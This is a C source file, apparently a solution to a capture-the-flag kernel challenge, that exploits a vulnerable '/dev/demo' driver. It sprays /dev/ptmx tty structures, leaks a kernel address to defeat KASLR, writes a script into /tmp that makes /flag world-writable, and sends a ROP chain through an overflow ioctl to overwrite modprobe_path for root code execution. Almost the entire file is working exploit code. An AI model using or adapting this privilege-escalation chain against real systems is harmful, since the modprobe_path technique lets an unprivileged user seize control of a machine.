#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdint.h>
#include <syscall.h>
#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include <signal.h>
#include <assert.h>
#include <stdint.h>

#include "demo_note.h"

#define ASM __asm__
#define PAUSE scanf("%*c");


int main(){

    int pfd[0x100];
	for( int i = 0 ; i < 0x100 ; ++i ){
        pfd[i] = open( "/dev/ptmx" , O_RDWR | O_NOCTTY ); // tty_struct
        if (pfd[i] == -1)
            printf("open ptmx err\n");
    }
	for( int i = 0 ; i < 0x100 ; ++i )
        close(pfd[i]);


    int fd = open("/dev/demo", O_RDWR);
    size_t buf[0x100] = {0};
    add_note(fd, 0x2c0);
    read_note(fd, 0, buf);


    size_t kbase = buf[3] - 0x10a6f20;
    printf( "[*] kernel base -> %p\n", kbase );
    // leak done

    puts("[+] Prepare modprobe_path file.");
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /tmp/x");
    system("chmod +x /tmp/x");

    puts("[+] Prepare trigger file.");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fake");
    system("chmod +x /tmp/fake");

    size_t rop[100];
    size_t pop_rdi = kbase + 0x815d0;
    size_t pop_rsi = kbase + 0x1cc43a;
    size_t mov_ptr_rdi_rsi = kbase + 0x6df00;
    size_t modprobe_path = kbase + 0x1663900;

    int i = -1;
    rop[++i] = pop_rdi;
    rop[++i] = modprobe_path;
    rop[++i] = pop_rsi;
    rop[++i] = 0x782f706d742f;    // overwrite modeprobe_path -> "/tmp/x"
    rop[++i] = mov_ptr_rdi_rsi;

    req.arg1 = rop;
    ioctl( fd, DEMO_OVERFLOW , &req );


    return 0;
}